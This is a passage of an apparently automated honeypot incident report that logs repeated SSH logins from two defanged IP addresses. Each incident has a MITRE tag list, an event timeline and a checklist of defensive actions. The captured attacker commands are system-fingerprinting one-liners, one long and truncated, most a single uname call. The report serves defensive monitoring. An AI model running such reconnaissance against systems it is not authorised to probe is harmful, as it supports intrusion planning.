| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:19` | `cowrie.session.connect` |
| `2026-08-15 05:38:19` | `cowrie.client.version` |
| `2026-08-15 05:38:19` | `cowrie.client.kex` |
| `2026-08-15 05:38:21` | `cowrie.login.success` |
| `2026-08-15 05:38:22` | `cowrie.session.params` |
| `2026-08-15 05:38:22` | `cowrie.command.input` |
| `2026-08-15 05:38:22` | `cowrie.command.input` |
| `2026-08-15 05:38:22` | `cowrie.command.input` |
| `2026-08-15 05:38:22` | `cowrie.command.input` |
| `2026-08-15 05:38:22` | `cowrie.command.input` |
| `2026-08-15 05:38:22` | `cowrie.command.success` |
| `2026-08-15 05:38:22` | `cowrie.command.input` |
| `2026-08-15 05:38:22` | `cowrie.command.input` |
| `2026-08-15 05:38:22` | `cowrie.command.input` |
| `2026-08-15 05:38:22` | `cowrie.command.input` |
| `2026-08-15 05:38:23` | `cowrie.log.closed` |
| `2026-08-15 05:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22b7e9d0a07a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:23` | `cowrie.session.connect` |
| `2026-08-15 05:38:23` | `cowrie.client.version` |
| `2026-08-15 05:38:23` | `cowrie.client.kex` |
| `2026-08-15 05:38:23` | `cowrie.login.success` |
| `2026-08-15 05:38:24` | `cowrie.session.params` |
| `2026-08-15 05:38:24` | `cowrie.command.input` |
| `2026-08-15 05:38:24` | `cowrie.log.closed` |
| `2026-08-15 05:38:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cabaaf66d9b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:28` | `cowrie.session.connect` |
| `2026-08-15 05:38:28` | `cowrie.client.version` |
| `2026-08-15 05:38:28` | `cowrie.client.kex` |
| `2026-08-15 05:38:29` | `cowrie.login.success` |
| `2026-08-15 05:38:29` | `cowrie.session.params` |
| `2026-08-15 05:38:29` | `cowrie.command.input` |
| `2026-08-15 05:38:30` | `cowrie.log.closed` |
| `2026-08-15 05:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c47bcd2d5ccc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:34` | `cowrie.session.connect` |
| `2026-08-15 05:38:34` | `cowrie.client.version` |
| `2026-08-15 05:38:34` | `cowrie.client.kex` |
| `2026-08-15 05:38:34` | `cowrie.login.success` |
| `2026-08-15 05:38:35` | `cowrie.session.params` |
| `2026-08-15 05:38:35` | `cowrie.command.input` |
| `2026-08-15 05:38:35` | `cowrie.log.closed` |
| `2026-08-15 05:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e5750d6135

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:39` | `cowrie.session.connect` |
| `2026-08-15 05:38:39` | `cowrie.client.version` |
| `2026-08-15 05:38:39` | `cowrie.client.kex` |
| `2026-08-15 05:38:40` | `cowrie.login.success` |
| `2026-08-15 05:38:40` | `cowrie.session.params` |
| `2026-08-15 05:38:40` | `cowrie.command.input` |
| `2026-08-15 05:38:40` | `cowrie.log.closed` |
| `2026-08-15 05:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8fde692ba20

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:44` | `cowrie.session.connect` |
| `2026-08-15 05:38:44` | `cowrie.client.version` |
| `2026-08-15 05:38:44` | `cowrie.client.kex` |
| `2026-08-15 05:38:45` | `cowrie.login.success` |
| `2026-08-15 05:38:45` | `cowrie.session.params` |
| `2026-08-15 05:38:45` | `cowrie.command.input` |
| `2026-08-15 05:38:46` | `cowrie.log.closed` |
| `2026-08-15 05:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04139b5c16f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:49` | `cowrie.session.connect` |
| `2026-08-15 05:38:49` | `cowrie.client.version` |
| `2026-08-15 05:38:49` | `cowrie.client.kex` |
| `2026-08-15 05:38:49` | `cowrie.login.success` |
| `2026-08-15 05:38:50` | `cowrie.session.params` |
| `2026-08-15 05:38:50` | `cowrie.command.input` |
| `2026-08-15 05:38:50` | `cowrie.log.closed` |
| `2026-08-15 05:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20c8c5fa54c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:54` | `cowrie.session.connect` |
| `2026-08-15 05:38:54` | `cowrie.client.version` |
| `2026-08-15 05:38:54` | `cowrie.client.kex` |
| `2026-08-15 05:38:55` | `cowrie.login.success` |
| `2026-08-15 05:38:55` | `cowrie.session.params` |
| `2026-08-15 05:38:55` | `cowrie.command.input` |
| `2026-08-15 05:38:55` | `cowrie.log.closed` |
| `2026-08-15 05:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35d1f5fba48d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:59` | `cowrie.session.connect` |
| `2026-08-15 05:38:59` | `cowrie.client.version` |
| `2026-08-15 05:38:59` | `cowrie.client.kex` |
| `2026-08-15 05:39:00` | `cowrie.login.success` |
| `2026-08-15 05:39:01` | `cowrie.session.params` |
| `2026-08-15 05:39:01` | `cowrie.command.input` |
| `2026-08-15 05:39:01` | `cowrie.log.closed` |
| `2026-08-15 05:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-022912efdbde

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:04` | `cowrie.session.connect` |
| `2026-08-15 05:39:04` | `cowrie.client.version` |
| `2026-08-15 05:39:05` | `cowrie.client.kex` |
| `2026-08-15 05:39:05` | `cowrie.login.success` |
| `2026-08-15 05:39:06` | `cowrie.session.params` |
| `2026-08-15 05:39:06` | `cowrie.command.input` |
| `2026-08-15 05:39:06` | `cowrie.log.closed` |
| `2026-08-15 05:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e9932cf5dc6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:10` | `cowrie.session.connect` |
| `2026-08-15 05:39:10` | `cowrie.client.version` |
| `2026-08-15 05:39:10` | `cowrie.client.kex` |
| `2026-08-15 05:39:10` | `cowrie.login.success` |
| `2026-08-15 05:39:11` | `cowrie.session.params` |
| `2026-08-15 05:39:11` | `cowrie.command.input` |
| `2026-08-15 05:39:11` | `cowrie.log.closed` |
| `2026-08-15 05:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d3c43c5c48a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:15` | `cowrie.session.connect` |
| `2026-08-15 05:39:15` | `cowrie.client.version` |
| `2026-08-15 05:39:15` | `cowrie.client.kex` |
| `2026-08-15 05:39:15` | `cowrie.login.success` |
| `2026-08-15 05:39:16` | `cowrie.session.params` |
| `2026-08-15 05:39:16` | `cowrie.command.input` |
| `2026-08-15 05:39:17` | `cowrie.log.closed` |
| `2026-08-15 05:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-361c9bd9f5a9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:20` | `cowrie.session.connect` |
| `2026-08-15 05:39:20` | `cowrie.client.version` |
| `2026-08-15 05:39:20` | `cowrie.client.kex` |
| `2026-08-15 05:39:20` | `cowrie.login.success` |
| `2026-08-15 05:39:21` | `cowrie.session.params` |
| `2026-08-15 05:39:21` | `cowrie.command.input` |
| `2026-08-15 05:39:21` | `cowrie.log.closed` |
| `2026-08-15 05:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8cb05425a41

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:25` | `cowrie.session.connect` |
| `2026-08-15 05:39:25` | `cowrie.client.version` |
| `2026-08-15 05:39:25` | `cowrie.client.kex` |
| `2026-08-15 05:39:25` | `cowrie.login.success` |
| `2026-08-15 05:39:26` | `cowrie.session.params` |
| `2026-08-15 05:39:26` | `cowrie.command.input` |
| `2026-08-15 05:39:26` | `cowrie.log.closed` |
| `2026-08-15 05:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb4dea1441a4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:30` | `cowrie.session.connect` |
| `2026-08-15 05:39:30` | `cowrie.client.version` |
| `2026-08-15 05:39:30` | `cowrie.client.kex` |
| `2026-08-15 05:39:30` | `cowrie.login.success` |
| `2026-08-15 05:39:31` | `cowrie.session.params` |
| `2026-08-15 05:39:31` | `cowrie.command.input` |
| `2026-08-15 05:39:31` | `cowrie.log.closed` |
| `2026-08-15 05:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ffb062eba4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:35` | `cowrie.session.connect` |
| `2026-08-15 05:39:35` | `cowrie.client.version` |
| `2026-08-15 05:39:35` | `cowrie.client.kex` |
| `2026-08-15 05:39:36` | `cowrie.login.success` |
| `2026-08-15 05:39:36` | `cowrie.session.params` |
| `2026-08-15 05:39:36` | `cowrie.command.input` |
| `2026-08-15 05:39:36` | `cowrie.log.closed` |
| `2026-08-15 05:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c23e13a01dd5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:41` | `cowrie.session.connect` |
| `2026-08-15 05:39:41` | `cowrie.client.version` |
| `2026-08-15 05:39:41` | `cowrie.client.kex` |
| `2026-08-15 05:39:41` | `cowrie.login.success` |
| `2026-08-15 05:39:42` | `cowrie.session.params` |
| `2026-08-15 05:39:42` | `cowrie.command.input` |
| `2026-08-15 05:39:42` | `cowrie.log.closed` |
| `2026-08-15 05:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd2a6e834b99

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:46` | `cowrie.session.connect` |
| `2026-08-15 05:39:46` | `cowrie.client.version` |
| `2026-08-15 05:39:46` | `cowrie.client.kex` |
| `2026-08-15 05:39:46` | `cowrie.login.success` |
| `2026-08-15 05:39:47` | `cowrie.session.params` |
| `2026-08-15 05:39:47` | `cowrie.command.input` |
| `2026-08-15 05:39:47` | `cowrie.log.closed` |
| `2026-08-15 05:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2a394512df9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:51` | `cowrie.session.connect` |
| `2026-08-15 05:39:51` | `cowrie.client.version` |
| `2026-08-15 05:39:51` | `cowrie.client.kex` |
| `2026-08-15 05:39:52` | `cowrie.login.success` |
| `2026-08-15 05:39:52` | `cowrie.session.params` |
| `2026-08-15 05:39:52` | `cowrie.command.input` |
| `2026-08-15 05:39:53` | `cowrie.log.closed` |
| `2026-08-15 05:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dc4dd01e283

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:39 |
| **Last Seen** | 2026-08-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:39:56` | `cowrie.session.connect` |
| `2026-08-15 05:39:56` | `cowrie.client.version` |
| `2026-08-15 05:39:56` | `cowrie.client.kex` |
| `2026-08-15 05:39:57` | `cowrie.login.success` |
| `2026-08-15 05:39:58` | `cowrie.session.params` |
| `2026-08-15 05:39:58` | `cowrie.command.input` |
| `2026-08-15 05:39:58` | `cowrie.log.closed` |
| `2026-08-15 05:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed35bb5caca7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:02` | `cowrie.session.connect` |
| `2026-08-15 05:40:02` | `cowrie.client.version` |
| `2026-08-15 05:40:02` | `cowrie.client.kex` |
| `2026-08-15 05:40:02` | `cowrie.login.success` |
| `2026-08-15 05:40:03` | `cowrie.session.params` |
| `2026-08-15 05:40:03` | `cowrie.command.input` |
| `2026-08-15 05:40:03` | `cowrie.log.closed` |
| `2026-08-15 05:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d82fa829fab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:07` | `cowrie.session.connect` |
| `2026-08-15 05:40:07` | `cowrie.client.version` |
| `2026-08-15 05:40:07` | `cowrie.client.kex` |
| `2026-08-15 05:40:07` | `cowrie.login.success` |
| `2026-08-15 05:40:08` | `cowrie.session.params` |
| `2026-08-15 05:40:08` | `cowrie.command.input` |
| `2026-08-15 05:40:08` | `cowrie.log.closed` |
| `2026-08-15 05:40:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c57095500893

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:12` | `cowrie.session.connect` |
| `2026-08-15 05:40:12` | `cowrie.client.version` |
| `2026-08-15 05:40:12` | `cowrie.client.kex` |
| `2026-08-15 05:40:13` | `cowrie.login.success` |
| `2026-08-15 05:40:14` | `cowrie.session.params` |
| `2026-08-15 05:40:14` | `cowrie.command.input` |
| `2026-08-15 05:40:14` | `cowrie.log.closed` |
| `2026-08-15 05:40:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a87041107d6b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:17` | `cowrie.session.connect` |
| `2026-08-15 05:40:17` | `cowrie.client.version` |
| `2026-08-15 05:40:17` | `cowrie.client.kex` |
| `2026-08-15 05:40:18` | `cowrie.login.success` |
| `2026-08-15 05:40:19` | `cowrie.session.params` |
| `2026-08-15 05:40:19` | `cowrie.command.input` |
| `2026-08-15 05:40:19` | `cowrie.log.closed` |
| `2026-08-15 05:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d71ea212c8b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:22` | `cowrie.session.connect` |
| `2026-08-15 05:40:22` | `cowrie.client.version` |
| `2026-08-15 05:40:22` | `cowrie.client.kex` |
| `2026-08-15 05:40:23` | `cowrie.login.success` |
| `2026-08-15 05:40:24` | `cowrie.session.params` |
| `2026-08-15 05:40:24` | `cowrie.command.input` |
| `2026-08-15 05:40:24` | `cowrie.log.closed` |
| `2026-08-15 05:40:24` | `cowrie.session.closed` |

